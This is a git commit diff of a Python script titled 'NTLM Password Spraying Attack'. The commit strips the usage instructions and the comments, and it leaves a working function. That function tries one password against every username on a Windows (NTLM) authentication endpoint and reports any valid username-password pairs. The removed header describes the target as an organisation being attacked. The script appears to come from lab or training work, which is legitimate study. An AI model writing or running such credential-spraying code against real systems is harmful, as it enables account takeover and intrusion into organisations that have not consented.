26e1832d72304e991e5d04b3c262da7ff010281b
Manole Alexandru Emil <100286841+AlexandruEmil@users.noreply.github.com>
2024-12-08 21:09:58 +0200

    Update NTLM Password Spraying Attack.py

--- NTLM Password Spraying Attack.py
+++ NTLM Password Spraying Attack.py
@@ -1,19 +1,10 @@
-#USE python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
-
-#   <userfile> - Textfile containing our usernames - "usernames.txt"
-#   <fqdn> - Fully qualified domain name associated with the organisation that we are attacking
-#   <password> - The password we want to use for our spraying attack
-#   <attackurl> - The URL of the application that supports Windows Authentication
-
 def password_spray(self, password, url):
     print ("[*] Starting passwords spray attack using the following password: " + password)
-    #Reset valid credential counter
+  
     count = 0
-    #Iterate through all of the possible usernames
+
     for user in self.users:
-        #Make a request to the website and attempt Windows Authentication
         response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
-        #Read status code of response to determine if authentication was successful
         if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
             print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
             count += 1
